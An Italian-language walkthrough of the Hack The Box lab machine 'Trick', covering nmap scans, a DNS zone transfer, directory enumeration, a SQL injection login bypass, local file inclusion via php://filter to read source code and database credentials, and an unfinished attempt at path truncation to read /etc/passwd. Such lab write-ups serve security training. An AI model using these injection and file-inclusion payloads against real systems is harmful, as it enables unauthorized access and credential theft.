#+title: HTB - Trick (Easy)
#+author: Andrea Pepe
#+date: 01/07/2022

* Foothold
** nmap
#+begin_example
$ sudo nmap -sC -sV trick                                                             1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 19:37 CEST
Nmap scan report for trick (10.10.11.166)
Host is up (0.051s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.27 seconds
#+end_example

#+begin_example
$ sudo nmap -p- trick                      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 19:37 CEST
Nmap scan report for trick (10.10.11.166)
Host is up (0.060s latency).
Not shown: 65531 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 34.05 seconds
#+end_example

** DNS Zone Transfer
#+begin_example
$ dig @trick root.trick.htb any                                                                                                                                                          1 ⚙

; <<>> DiG 9.18.0-2-Debian <<>> @trick root.trick.htb any
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 1205
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 0cf4b12e999255076d9e4eb762c2afc309151211c053fb7a (good)
;; QUESTION SECTION:
;root.trick.htb.			IN	ANY

;; AUTHORITY SECTION:
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800

;; Query time: 39 msec
;; SERVER: 10.10.11.166#53(trick) (TCP)
;; WHEN: Mon Jul 04 11:15:39 CEST 2022
;; MSG SIZE  rcvd: 107
#+end_example

#+begin_example
$ dig axfr @trick trick.htb                                                                                                                                                              1 ⚙

; <<>> DiG 9.18.0-2-Debian <<>> axfr @trick trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 59 msec
;; SERVER: 10.10.11.166#53(trick) (TCP)
;; WHEN: Mon Jul 04 11:14:54 CEST 2022
;; XFR size: 6 records (messages 1, bytes 231)
#+end_example

Vediamo che c'è un name server di *preprod-payroll.trick.htb*,
chiaramente server di preproduzione.

** Web server
*** file enumeration
#+begin_example
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://preprod-payroll.trick.htb -x php,js,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://preprod-payroll.trick.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,html,txt,php
[+] Timeout:                 10s
===============================================================
2022/07/04 11:22:19 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 9546] [--> login.php]
/home.php             (Status: 200) [Size: 486]                 
/login.php            (Status: 200) [Size: 5571]                
/header.php           (Status: 200) [Size: 2548]                
/users.php            (Status: 200) [Size: 2197]                
/assets               (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/assets/]
/ajax.php             (Status: 200) [Size: 0]                                                 
/database             (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/database/]
/readme.txt           (Status: 200) [Size: 149]                                                 
/navbar.php           (Status: 200) [Size: 1382]                                                
/department.php       (Status: 200) [Size: 4844]                                                
/topbar.php           (Status: 200) [Size: 585]                                                 
/position.php         (Status: 200) [Size: 5549]   
#+end_example

*** SQL injection
Ha funzionato l'injection sullo username :
#+begin_example
a' OR 1=1 #
#+end_example
Con la quale si riesce ad entrare come utente administrator.


** LFI
Vediamo subito che dalla pagina *index.php* sembra esserci una possibile
vulnerabilità a Local File Inclusion, in quanto la ricerca viene fatto
postponendo *?page=<page>* allo URL di base, come mostrato in figura:
[[./img/LFI.png]]

Inoltre, si nota che tutti i file php che vengono acceduti in questo
modo, richiedono che venga specificato solo il loro nome, senza
l'estensione /.php/. Per esserne sicuri, si prova a sfruttare la
potenziale vulnerabilità per prendere il codice proprio della pagina
*index.php*. Per farlo ed evitare che venga processata, si usano i
wrappers php, in particolare il filtro per l'encoding in base64, così
da poi convertirlo a mano ed avere il codice della pagina:
#+begin_example
http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=index
#+end_example

Il codice ottenuto e decodificato da base 64 è il seguente:
#+begin_src html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Admin | Employee's Payroll Management System</title>
 	

<?php
	session_start();
  if(!isset($_SESSION['login_id']))
    header('location:login.php');
 include('./header.php'); 
 // include('./auth.php'); 
 ?>

</head>
<style>
	body{
        background: #80808045;
  }
  .modal-dialog.large {
    width: 80% !important;
    max-width: unset;
  }
  .modal-dialog.mid-large {
    width: 50% !important;
    max-width: unset;
  }
  div#confirm_modal {
      z-index: 9991;
  }
</style>

<body>
	<?php include 'topbar.php' ?>
	<?php include 'navbar.php' ?>
  <div class="toast" id="alert_toast" role="alert" aria-live="assertive" aria-atomic="true">
    <div class="toast-body text-white">
    </div>
  </div>
  <main id="view-panel" >
      <?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>
  	<?php include $page.'.php' ?>
  	

  </main>

  <div id="preloader"></div>
  <a href="#" class="back-to-top"><i class="icofont-simple-up"></i></a>

<div class="modal fade" id="confirm_modal" role='dialog'>
    <div class="modal-dialog modal-md" role="document">
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title">Confirmation</h5>
      </div>
      <div class="modal-body">
        <div id="delete_content"></div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" id='confirm' onclick="">Continue</button>
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
      </div>
      </div>
    </div>
  </div>
  <div class="modal fade" id="uni_modal" role='dialog'>
    <div class="modal-dialog modal-md" role="document">
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title"></h5>
      </div>
      <div class="modal-body">
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" id='submit' onclick="$('#uni_modal form').submit()">Save</button>
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
      </div>
      </div>
    </div>
  </div>
</body>
<script>
	 window.start_load = function(){
    $('body').prepend('<di id="preloader2"></di>')
  }
  window.end_load = function(){
    $('#preloader2').fadeOut('fast', function() {
        $(this).remove();
      })
  }

  window.uni_modal = function($title = '' , $url='',$size=""){
    start_load()
    $.ajax({
        url:$url,
        error:err=>{
            console.log()
            alert("An error occured")
        },
        success:function(resp){
            if(resp){
                $('#uni_modal .modal-title').html($title)
                $('#uni_modal .modal-body').html(resp)
                if($size != ''){
                    $('#uni_modal .modal-dialog').addClass($size)
                }else{
                    $('#uni_modal .modal-dialog').removeAttr("class").addClass("modal-dialog modal-md")
                }
                $('#uni_modal').modal({
                  show:true,
                  backdrop:'static',
                  keyboard:false,
                  focus:true
                })
                end_load()
            }
        }
    })
}
window._conf = function($msg='',$func='',$params = []){
     $('#confirm_modal #confirm').attr('onclick',$func+"("+$params.join(',')+")")
     $('#confirm_modal .modal-body').html($msg)
     $('#confirm_modal').modal({
                  show:true,
                  backdrop:'static',
                  keyboard:false,
                  focus:true
                })
  }
   window.alert_toast= function($msg = 'TEST',$bg = 'success'){
      $('#alert_toast').removeClass('bg-success')
      $('#alert_toast').removeClass('bg-danger')
      $('#alert_toast').removeClass('bg-info')
      $('#alert_toast').removeClass('bg-warning')

    if($bg == 'success')
      $('#alert_toast').addClass('bg-success')
    if($bg == 'danger')
      $('#alert_toast').addClass('bg-danger')
    if($bg == 'info')
      $('#alert_toast').addClass('bg-info')
    if($bg == 'warning')
      $('#alert_toast').addClass('bg-warning')
    $('#alert_toast .toast-body').html($msg)
    $('#alert_toast').toast({delay:3000}).toast('show');
  }
  $(document).ready(function(){
    $('#preloader').fadeOut('fast', function() {
        $(this).remove();
      })
  })
  $('.datetimepicker').datetimepicker({
      format:'Y/m/d H:i',
      startDate: '+3d'
  })
  $('.select2').select2({
    placeholder:"Please select here",
    width: "100%"
  })
</script>	
</html>
#+end_src

Come ipotizzato, nel tag <mail> dell'html, c'è una parte di codice php
in cui viene invocata la include sul valore passato alla GET HTTP col
parametro 'page', la quale viene suffisso '.php'

Con lo stesso metodo, prendiamo il codice anche delle altre pagine php
per vedere se c'è qualcosa di interessante. In particolare, da uno
snippet della pagina *login.php*, c'è quanto segue:
#+begin_src html
<?php include('./header.php'); ?>
<?php include('./db_connect.php'); ?>
<?php 
session_start();
if(isset($_SESSION['login_id']))
header("location:index.php?page=home");
?>
#+end_src

Vediamo che viene fatto un include di un file *db_connect.php* che non
era stato trovato da ~gobuster~ durante la file enumeration. Proviamo a
prenderlo, magari contiene delle credenziali per il database.

*** db_connect.php
In effetti, è proprio così:
#+begin_src html
<?php 

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
#+end_src

Quindi, abbiamo le seguenti credenziali:
*remo:TrulyImpossiblePasswordLmao123*


** LFI Path Truncation
Proviamo ad inibire l'aggiunta dell'estensione '.php' al termine
della richiesta HTTP, terminandola con un byte nullo %00:
#+begin_example
http://preprod-payroll.trick.htb/index.php?page=../../../../../../../../etc/passwd%00
#+end_example

Tuttavia, non otteniamo alcun risultato. In effetti, questo trick
funziona solo con versioni di PHP precedenti alla 5.3.

A questo punto, cercando in rete come risolvere tale problema, dal
seguente [[https://security.stackexchange.com/questions/17407/how-can-i-use-this-path-bypass-exploit-local-file-inclusion][link]] si apprende che PHP quando carica dei file fa lo strip
dei trailing slashes alla fine, quindi è possibile aggiungere quanti
caratteri di tipo './' si vuole al termine
(e.g. //etc/passwd//./././././././././././<...>).
Inoltre, la cosa super interessante è che se il filename è più lungo
di 4096 bytes, in molte installazioni di php, esso viene *troncato* a
4096 bytes!

Sfruttiamo questa cosa per provare a leggere il file passwd in /etc,
costruendoci la richiesta in automatico con python e iniettandola da
burpsuite.

